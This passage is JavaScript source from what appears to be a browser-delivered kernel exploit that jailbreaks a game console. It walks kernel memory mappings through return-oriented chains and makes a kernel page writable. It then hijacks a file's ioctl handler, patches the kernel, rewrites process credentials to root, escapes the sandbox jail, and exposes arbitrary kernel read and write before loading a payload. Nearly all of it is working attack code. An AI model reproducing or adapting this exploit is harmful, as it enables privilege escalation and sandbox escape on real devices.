          const below = hostPage.hi < b0.hi || (hostPage.hi === b0.hi && hostPage.low < b0.low);
          if (above && below) { reach = Math.min(TUNE.entries, i + 2); break; }
        }
      }
      say("[3a] walking " + reach + " of " + TUNE.entries + " entries"
          + (MAPS ? (", " + MAPS.length + " mapped") : ""));

      const note = alloc(128), ftab = alloc(0x100);
      const maps = alloc(TUNE.entries * TUNE.stride + 0x100);
      wipe(note, 128); wipe(ftab, 0x100); wipe(maps, TUNE.entries * TUNE.stride);

      /* Four shots or three: the walk through the mapping list can ride along
         with the handle chain or cost a shot of its own. Separate is the form
         that has evidence behind it; merged is one shot fewer, and so one more
         chance of the hole being won by something else. */
      const merged = ((ctx.params && ctx.params.get("shots")) || "4") === "3";

      const walkLoop = function (c) {
        for (let k = 0; k < reach; k++) {
          const src = c.grab(plus(maps.at, k * TUNE.stride), TUNE.stride);
          c.load_rax(c.where(src));
          c.gad("load8");
        }
      };

      const r2 = shot.take(function (c) {
        c.slot(kat(K.swap_rbp));
        c.save_rax(note.at);
        c.slot(kat(K.swap_rbp));
        c.load_rax(note.at);
        c.follow(0);
        c.follow(-328);                 /* thread */
        c.save_rax(plus(note.at, 8));
        c.gad("load8");                   /* process */
        c.save_rax(plus(note.at, 16));
        c.follow(0x48);                   /* descriptor table */
        c.follow(0);                      /* open file array */
        c.follow(probe * 8);              /* our file */
        c.save_rax(plus(note.at, 40));
        c.gad("load8");                   /* its operation table */
        c.save_rax(plus(note.at, 48));
        c.grab(ftab.at, 0x58);

        if (merged) {
          c.load_rax(plus(note.at, 16));  /* process again, memcpy clobbered rax */
          c.follow(0x168);                /* address space */
          c.gad("load8");                 /* first mapping */
          walkLoop(c);
        }
      }, merged ? 0x1000 + reach * 0x100 : 0x1000);

      const file = qAt(note, 40), ops = qAt(note, 48);
      say("[3] chain=" + (r2 === null ? ("null -- " + shot.why) : r2) + " file=" + text(file) + " ops=" + text(ops));
      if (!inHeap(file) || !inText(ops)) {
        say("    handles implausible -- nothing written"); STATE.retry = true; return false;
      }

      let sane = 0;
      for (let k = 0; k < 10; k++) if (inText(qAt(ftab, k * 8))) sane++;
      if (sane < 6) { say("    operation table unusable, " + sane + " of 10"); return false; }

      let r2b = -1;
      if (!merged) {
        r2b = shot.take(function (c) {
          c.slot(kat(K.swap_rbp));
          c.save_rax(note.at);
          c.slot(kat(K.swap_rbp));
          c.load_rax(note.at);
          c.follow(0);
          c.follow(-328);               /* thread */
          c.gad("load8");                 /* process */
          c.follow(0x168);                /* address space */
          c.gad("load8");                 /* first mapping */
          walkLoop(c);
        }, 0x1000 + reach * 0x100);
        say("[3b] address space walked, chain="
            + (r2b === null ? ("null -- " + shot.why) : r2b));
        if (!ran(r2b)) {
          say("    the chain did not run -- the hole was refilled with a real object");
          STATE.retry = true;
          return false;
        }
      }



      /* ---- the mapping that covers the host page --------------------------- */

      let hit = null, walked = 0;
      for (let k = 0; k < reach; k++) {
        const from = qAt(maps, k * TUNE.stride + 0x20);
        const upto = qAt(maps, k * TUNE.stride + 0x28);
        if (from.low === 0 && from.hi === 0 && upto.low === 0 && upto.hi === 0) break;
        /* the list is circular and its head spans the whole address space, so it
           matches everything. Anything wider than a terabyte is that head. */
        if (upto.hi - from.hi > 0x100) break;
        walked = k + 1;
        const above = from.hi < hostPage.hi || (from.hi === hostPage.hi && from.low <= hostPage.low);
        const below = hostPage.hi < upto.hi || (hostPage.hi === upto.hi && hostPage.low < upto.low);
        if (above && below) { hit = k; break; }
      }
      if (hit === null) { say("[4] no mapping covers the host page, " + walked + " walked"); return false; }
      /* the address of entry k is the forward pointer of entry k-1, so the first
         entry has nothing to take it from */
      if (hit === 0) { say("[4] the host page is the first mapping -- cannot address it"); return false; }

      const rights = maps.dv.getUint32(hit * TUNE.stride + 0x5c, true);
      const locked = maps.dv.getUint32(hit * TUNE.stride + 0x88, true);
      const here = qAt(maps, (hit - 1) * TUNE.stride + 0x08);
      const now = rights % 256, ceiling = Math.floor(rights / 256) % 256;

      say("[4] mapping " + hit + " at " + text(here) + " rights=0x" + now.toString(16)
          + " ceiling=0x" + ceiling.toString(16));
      if (locked % 2 === 1 || !inHeap(here) || now === 0 || ceiling === 0
          || Math.floor(now / 4) % 2 !== 1) {
        say("    not the mapping we want -- nothing written"); return false;
      }

      /* ---- widen it, take over the file, run the bootstrap ----------------- */

      /* the page already reads and executes; all it lacks is write. Touching the
         execute bit here is what broke every earlier attempt. */
      let widened = rights;
      if (Math.floor(widened / 0x200) % 2 === 0) widened += 0x200;

      const wRights = alloc(16); wRights.dv.setUint32(0, widened >>> 0, true);
      const wTable = alloc(16); pokeAt(wTable, 0, ftab.at);
      pokeAt(ftab, 0x18, hostFree);                      /* the ioctl slot */

      const r3 = shot.take(function (c) {
        c.put(plus(here, 0x5c), wRights.at, 4);
        c.put(plus(file, 0x08), wTable.at, 8);
      });
      say("[5] widen and hook: " + (r3 === null ? ("null -- " + shot.why) : r3));
      if (!ran(r3)) { say("    chain did not run -- kernel untouched"); STATE.retry = true; return false; }

      if (sc(S.mprotect, hostPage, 0x1000, 7).i32 !== 0) {
        say("    page did not turn writable -- not calling into it"); return false;
      }
      const boot = unhex(BOOTSTRAP);
      wrbuf(hostFree, boot);
      if (!sameBytes(rdbuf(hostFree, boot.length), boot)) {
        say("    bootstrap did not stick"); return false;
      }

      const m1 = sc(S.mmap, 0, 0x4000, 3, 0x1002, -1, 0);
      const before = sc(S.mprotect, v(m1.lo, m1.hi), 0x4000, 7).i32;
      sc(S.ioctl, probe, 0xC0000000 + (8 * 0x10000) + (97 * 0x100) + 1, alloc(64).at);
      const m2 = sc(S.mmap, 0, 0x4000, 3, 0x1002, -1, 0);
      const after = sc(S.mprotect, v(m2.lo, m2.hi), 0x4000, 7).i32;

      /* The file has to go back before anything closes it, or fo_close walks into
         the forged table. The gate is planted by now, so that one word need not
         cost another trigger: each trigger is a chance for a foreign allocation
         to win the hole, and the pivot then loads a stack pointer out of someone
         else's object. The trigger stays as the fallback -- when the bootstrap
         did not run, there is no gate to write through. */
      const k = openRing0(hostFree);
      const thread = (before !== 0 && after === 0) ? k.thread() : null;
      const gated = thread !== null && inHeap(thread);

      if (!(gated && k.write_v(plus(file, 0x08), ops))) {
        const wOld = alloc(16); pokeAt(wOld, 0, ops);
        shot.take(function (c) { c.put(plus(file, 0x08), wOld.at, 8); });
      }
      sc(S.close, probe);

      if (before === 0 || after !== 0) {
        say("[6] kernel unchanged, rwx " + before + " before and " + after + " after -- "
            + shot.fired + " shots used");
        return false;
      }
      say("[6] kernel patched, rwx is open -- " + shot.fired + " shots used");

      /* ---- everything from here runs through the gate ---------------------- */

      if (!gated) { say("[7] the gate did not answer"); return false; }
      const base2 = k.base();
      if (!base2 || !same(base2, kbase)) {
        say("[7] the gate reports " + (base2 ? text(base2) : "nothing")
            + ", the leak said " + text(kbase));
        return false;
      }
      say("[7] gate is live, thread " + text(thread));

      /* From here the kernel is open AND the handles are armed. Any abort
         between here and [10] used to leave them that way. The next process exit
         then ends every fo_close in apmclose -> destroy_dev_sched, the exit never
         completes, and the browser cannot even be restarted -- closing it IS that
         exit. Only a console restart recovers from it. `ofs` hangs off `thread`
         alone, so it can be derived here. */
      const failOut = function (why) {
        say(why);
        try {
          const p0 = k.read_v(plus(thread, 0x08));
          const f0 = p0 && k.read_v(plus(p0, 0x48));
          const o0 = f0 && k.read_v(f0);
          if (o0 && inHeap(o0)
              && teardown(k, kbase, o0, shot.devs, shot.queues, hostFree))
            say("handles defused after the failure -- this page may close");
          else
            say("the handles are NOT defused -- do not close this page, cold boot instead");
        } catch (e) {
          say("teardown threw: " + ((e && e.message) || e));
        }
        return false;
      };

      if (!k.apply(kbase, PATCHES)) { return failOut("[8] the patch pass did not return"); }
      let done = 0, failed = null;
      for (let i = 0; i < PATCHES.length; i++) {
        const bytes = unhex(PATCHES[i][1]);
        const got = k.read(kat(PATCHES[i][0]), bytes.length);
        if (got && sameBytes(got, bytes)) done++; else failed = failed || PATCHES[i][2];
      }
      say("[8] " + done + " of " + PATCHES.length + " kernel patches in place"
          + (failed ? (" -- first missing: " + failed) : ""));
      if (done < PATCHES.length) { return failOut("     refusing to go on with a half patched kernel"); }

      const proc = k.read_v(plus(thread, 0x08));
      const fdt = proc && k.read_v(plus(proc, 0x48));
      const ofs = fdt && k.read_v(fdt);
      if (!ofs || !inHeap(ofs)) { return failOut("[9] descriptor table unreadable"); }

      /* ---- out of the sandbox --------------------------------------------- */

      const ucred = proc && k.read_v(plus(proc, 0x40));
      if (!ucred || !inHeap(ucred)) { return failOut("[9] no credentials"); }

      const z4 = new Uint8Array([0, 0, 0, 0]);
      const offs = [0x04, 0x08, 0x0c, 0x14];
      for (let i = 0; i < offs.length; i++) k.write(plus(ucred, offs[i]), z4);
      k.write(plus(ucred, 0x10), new Uint8Array([1, 0, 0, 0]));   /* cr_ngroups */

      const prison0 = k.read_v(kat(K.prison0));
      if (!prison0 || !inText(prison0)) {
        return failOut(
          "[9] prison0 pointer is " + (prison0 ? text(prison0) : "unreadable")
            + " -- not touching credentials",
        );
      }
      k.write_v(plus(ucred, 0x30), prison0);                      /* cr_prison */
      const caps = new Uint8Array(16); caps.fill(0xff);
      k.write(plus(ucred, 0x60), caps);

      const rootvnode = k.read_v(kat(K.rootvnode));
      if (!rootvnode || !inHeap(rootvnode)) { return failOut("[9] rootvnode is not set"); }
      k.write_v(plus(fdt, 0x10), rootvnode);                      /* fd_rdir */
      k.write_v(plus(fdt, 0x18), rootvnode);                      /* fd_jdir */

      if (sc(S.getuid).i32 !== 0) { return failOut("[9] still not root"); }
      say("[9] jailbroken, uid 0");

      /* ---- hand the host its kernel interface ------------------------------ */

      const iface = {
        base: kbase,
        curproc: proc,
        curproc_fd: fdt,
        curproc_ofiles: ofs,
        thread: thread,
        read: function (at, len) {
          const out = new Uint8Array(len);
          let got = 0;
          while (got < len) {
            const n = Math.min(len - got, STAGE_MAX);
            const s = k.read(plus(at, got), n);
            if (!s) return null;
            out.set(s, got); got += n;
          }
          return out;
        },
        write: function (at, bytes) {
          let done2 = 0;
          while (done2 < bytes.length) {
            const n = Math.min(bytes.length - done2, STAGE_MAX);
            if (!k.write(plus(at, done2), bytes.subarray(done2, done2 + n))) return false;
            done2 += n;
          }
          return true;
        },
        read8: function (at) { return k.read_v(at); },
        write8: function (at, q) { return k.write_v(at, q); },
        /* On this platform the loader tables are text relative -- the PS4 row
           carries PRISON0 0x111fa18 and ROOTVNODE 0x2136e90, the same values used
           above against this base -- so data_base holds it too. */
        data_base: kbase,
      };

      /* Every attempt leaves device handles and a queue behind. Closing them now
         kills the console, and leaving them kills it when the process exits.
         release_handles does neither; it has to run before anything closes. */
      iface.devs = shot.devs;
      iface.queues = shot.queues;
      if (ctx.state) ctx.state.afterglow = iface;

      say("[10] kernel interface is live -- " + shot.devs.length + " handles held open");

      /* straight away, not on request: in this host the process can die at any
         moment and that is the moment this prevents */
      iface.defused = teardown(k, kbase, ofs, shot.devs, shot.queues, hostFree);
      say(iface.defused
          ? "handles defused -- this page may close"
          : "the handles are NOT defused -- do not let this page close");

      // Karo Host supplies one known payload; loadEnabler detects its actual format.
      iface.payload = await loadEnabler(KaroPayloadFile, k, kbase, hostFree);
      say("done -- jailbroken, rwx open, syscall 11 is a kexec gate"
          + (iface.payload ? ", enabler running" : ""));
      return iface;
    }

    /* An attempt that fell short leaves its handles live, and those are only
       defused once step 10 is reached -- so stopping on a recoverable miss is the
       worst of both: nothing gained, and a process that hangs when the page goes
       away. The kernel base survives in STATE, so a second attempt skips the leak
       and costs only triggers. A spent budget, or anything that already touched
       the kernel, is not retried. */
    async function runAfterglow(ctx, opts) {
      const max = (opts && opts.tries) || 4;
      for (let n = 1; n <= max; n++) {
        const r = await attempt(ctx);
        if (r) return r;
        if (!STATE.retry) return false;
        if (n === max) { say("gave up after " + n + " attempts"); return false; }
        say("attempt " + n + " fell short -- going again");
        await new Promise(function (ok) { setTimeout(ok, 400); });
      }
      return false;
    }

    var afterglow = /*#__PURE__*/Object.freeze({
        __proto__: null,
        probeAfterglow: probeAfterglow,
        runAfterglow: runAfterglow
    });

})();
